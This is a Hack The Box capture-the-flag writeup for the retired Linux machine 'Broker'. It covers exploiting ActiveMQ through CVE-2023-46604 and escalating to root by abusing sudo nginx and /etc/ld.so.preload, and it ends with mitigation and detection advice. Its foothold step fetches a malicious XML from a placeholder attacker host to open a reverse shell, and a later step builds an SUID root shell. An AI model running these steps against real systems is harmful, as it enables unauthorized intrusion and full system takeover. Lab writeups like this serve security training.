---
machine: Broker
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, activemq, deserialization, sudo, nginx]
---

# Broker — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

ActiveMQ 5.15.15 exposes OpenWire with CVE-2023-46604. The admin panel accepts `<DEFAULT_USER>:<DEFAULT_PASSWORD>`, confirming the version; a malicious Spring XML runs commands as `activemq`. Escalation abuses `sudo nginx` to poison `/etc/ld.so.preload` and load a shared library as root.

## Recon

```bash
nmap -Pn -sCV -p22,80,1883,5672,8161,61613,61614,61616 <IP>
```

- `22/tcp` SSH, `80/tcp` nginx with basic auth and `8161/tcp` the ActiveMQ Jetty console.
- `61616/tcp` speaks OpenWire and identifies ActiveMQ `5.15.15`.
- `1883/tcp` MQTT, `5672/tcp` AMQP and `61613/tcp` STOMP belong to the same broker.

## Enumeration

- The `8161` console accepts `<DEFAULT_USER>:<DEFAULT_PASSWORD>` and discloses the broker version and status.
- Version `5.15.15` is within the CVE-2023-46604 vulnerable range (before `5.15.16`).
- The public exploit sends a serialized object that makes ActiveMQ load an attacker-controlled Spring XML.

## Foothold

Host a `poc.xml` containing a `ProcessBuilder` that starts a reverse shell and point the exploit at `61616`.

```bash
python3 exploit.py -i <IP> -u http://<ATTACKER>/poc.xml
nc -lnvp 9001
```

The process runs as `activemq`, the service account.

## Lateral movement

There is no second host. The pivot is from the broker to the operating system through remote execution and then from `activemq` to root through `sudo`.

## Privilege escalation

`sudo -l` allows `/usr/sbin/nginx` as root. Run nginx with its error log pointing at `/etc/ld.so.preload`; every log line is treated as a library to preload. Copy `/bin/bash`, compile a `.so` whose constructor runs `chown root` and `chmod 4755`, and trigger a privileged execution.

```bash
sudo -l
sudo /usr/sbin/nginx -c /tmp/nginx.conf
gcc -fPIC -shared -ldl -o /tmp/pwn.so /tmp/pwn.c
sudo -l                 # loads pwn.so and prepares /tmp/rootshell
/tmp/rootshell -p
```

## Evidence

- `8161` response showing ActiveMQ `5.15.15`.
- Reverse shell connected as `activemq`.
- `sudo -l` showing `NOPASSWD: /usr/sbin/nginx` and `/tmp/rootshell` with SUID.

## Lessons learned

- A broker exposed on `61616` can be compromised without authentication if unpatched.
- Default console credentials confirm the version and ease the attack.
- `sudo` on a web server enables configuration and loader-path manipulation.

## Mitigation and detection

- Update ActiveMQ to `5.15.16` or later and restrict `61616` to the internal network.
- Change console credentials and disable default accounts.
- Audit `sudo`, nginx executions and writes to `/etc/ld.so.preload`.

## References

- [0xdf — Broker](https://0xdf.gitlab.io/2023/11/09/htb-broker.html)
- [IppSec — Broker](https://www.youtube.com/watch?v=Ul9WmUY49oM)
- [Hack The Box — Broker](https://app.hackthebox.com/machines/broker)
